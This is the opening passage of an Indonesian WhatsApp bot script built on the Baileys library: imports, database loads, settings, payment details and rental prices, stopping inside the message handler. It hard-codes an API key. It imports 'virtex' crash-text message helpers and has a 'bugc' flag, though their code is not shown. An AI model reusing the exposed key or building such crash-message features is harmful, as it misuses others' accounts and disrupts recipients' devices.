/*

	あ IZIN SEBELUM RE UPLOAD
	あ YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
	あ FITUR JUALAN TELAH DI HAPUS [ Bisa order klo mau ]
	
	あ JASA RUN HEROKU BISA PC wa.me/62887435047326 BIAR BOT NYA GAK TERLALU DELAY
	
*/   
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const crypto = require('crypto')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const hx = require('hxz-api')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const simple = require('./lib/simple.js')
const _sewa = require("./lib/sewa");
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { yta2, ytv2, ytv3, ytv4} = require('./lib/y2mate')
const { tiktokDown } = require("./lib/tiktok")
const { webp2mp4File} = require('./lib/webp2mp4')
const { mediafireDl} = require('./lib/mediafire.js')
const { msgFilter } = require('./lib/antispam')
const { downloadig, igstory } = require("./lib/instadl.js");
const { virtex, vipi } = require('./lib/virtex.js')
const setTtt = require('./lib/tictactoe.js')
const off = require('./lib/afk.js')
let _off = JSON.parse(fs.readFileSync('./src/afk.json'))
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const premium = require("./lib/premiun");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/about_user")
const { list_aov } = require('./shop/aov')
const { list_cod } = require('./shop/cod')
const { list_sausage } = require('./shop/sausage')
const { list_lol } = require('./shop/lol')
const { list_valo } = require('./shop/valo')
const { list_price } = require('./shop/price')
const { allpayment } = require('./shop/allpayment')
const { pc_sewa } = require('./shop/sewa')
const { gcbotwa } = require('./shop/grupbot')
const { donasibot } = require('./shop/donasi')
const { infobot } = require('./shop/infobot')
const { jadibut } = require('./shop/jadibot')

const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'))
const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const register = JSON.parse(fs.readFileSync('./database/user/register.json'))
const  _premium = JSON.parse(fs.readFileSync('./src/premiun.json'));
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync("./src/antivirtex.json"))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const absen = JSON.parse(fs.readFileSync('./src/absen.json'))
const tictactoe = JSON.parse(fs.readFileSync("./src/tictactoe.json"))
const _win = JSON.parse(fs.readFileSync('./src/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./src/tttlose.json'))
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
const banned = JSON.parse(fs.readFileSync('./src/banned.json'))
const _nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const _leveling = JSON.parse(fs.readFileSync('./src/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./src/level.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./src/tebakgambar.json'))
const caklontong = JSON.parse(fs.readFileSync('./src/caklontong.json'))
const family = JSON.parse(fs.readFileSync('./src/family100.json'))
const tebakanime = JSON.parse(fs.readFileSync('./src/tebakanime.json'))
const  sewa = JSON.parse(fs.readFileSync('./src/sewa.json'));
const event = JSON.parse(fs.readFileSync('./src/event.json'))


//var creatorList = ['Creator WhatsApp Bot', 'Whatsapp Bot Indonesia', 'Creator Bot' , ' Bot WhatsApp']
var creator = setting.ownername
const  { ind, eng, es, ml, ru, pt } = require(`./language`)
lang = ind //language
const Exif = require('./lib/exif')
const exif = new Exif()

//set_sticker_command//
cmd_stc_menu = '7446'
cmd_stc_ping = '7292'
cmd_stc_play_music = '8046'
cmd_stc_group_close = '7850'
cmd_stc_group_open = '7878'
cmd_stc_image_to_sticker = '7688'
cmd_stc_to_image = '6964'
cmd_stc_self = '7038'
cmd_stc_public = '7144'
//set_sticker_command//
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /*
SEBAGIAN LU EDIT DI SETTING.JSON
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
var nomor_ovo = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var nomor_dana = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var nomor_gopay = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var qr_code_ovo = 'https://h.top4top.io/p_2053vk0uw1.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_dana = 'https://j.top4top.io/p_20532posd1.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_gopay = 'https://i.top4top.io/p_2053em3vh1.jpg' //gk usah di ubah ya klo gk punya ntr eror

var _minggu = 'Rp 10.000,00' //Masukkan harga sewa sesuai keinginan
var __minggu = 'Rp 15.000,00'
var ___minggu = 'Rp 20.000,00'
var _bulan = 'Rp 22.000,00'
var _permanen = 'Rp 100.000,00'
var __permanen = 'Rp 150.000,00'

zeksApikey = 'ANASKAUTSAR' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.me' // regis disini klo mau dapat apikeynya
thumbnail = setting.thumb
pp_bot = fs.readFileSync(`image/${thumbnail}`)
fthumb = setting.fakethumb
hit_today = []
blocked = []
ban = []
limitawal = "100"
gcounttprem = "105" 
gcounttuser = "200" 

let multi = true
let nopref = false
let single = false
let prefa = setting.prefix
let menusimple = true
let Mloc = false
let autobio = setting.autobio
let antihidetag = setting.antihidetag

banChats = setting.self_mode
autorespon = true
offline = false
readGc = false
readPc = false 
antitrol = false 
bugc = false
autovn =false
autoketik = false
autoregister = setting.user_register

img = setting.img
baper = 'ｖｙｎｕｔｚｘｘ２２'
apiku = 'https://youtu.be/2rWbjrDIAyA'
gc_wa_lu = 'https://chat.whatsapp.com/LifMSuXDkolEYxln5Klb4s' //klo gk punya gc wa gk usah di ganti 👍
targetpc = setting.ownerNumberr
owner = targetpc
fake = setting.fake
numbernye = '0'
waktu = 'Nothing'
alasan = 'Nothing'
botname = setting.botname
ownername = setting.ownername
peknem = setting.ownername
ownerNumber = setting.ownerNumber
cr = setting.cr
petik = '```'
titik =`...`
enter ='\n'
msgId="B826873620DD5947E683E3ABE663F263"
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
winawal = 1 
loseawal = 1 
memberwin = 1 
memberlose = 1 

//Credit For 404 SQUAD ( Gk usah di hapus mek)
//Lingz
//Felix
//Lenz
//Arya
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const ikan = JSON.parse(fs.readFileSync('./database/user/ikan.json'))
const planet = JSON.parse(fs.readFileSync('./database/user/planet.json'))
const coal = JSON.parse(fs.readFileSync('./database/user/coal.json'))
const stone = JSON.parse(fs.readFileSync('./database/user/stone.json'))
const ore = JSON.parse(fs.readFileSync('./database/user/ore.json'))
const ingot = JSON.parse(fs.readFileSync('./database/user/ingot.json'))
const kayu = JSON.parse(fs.readFileSync('./database/user/kayu.json'))

//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(alpha, mek)
		let { mentioned } = m
		bail = m.isBaileys
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
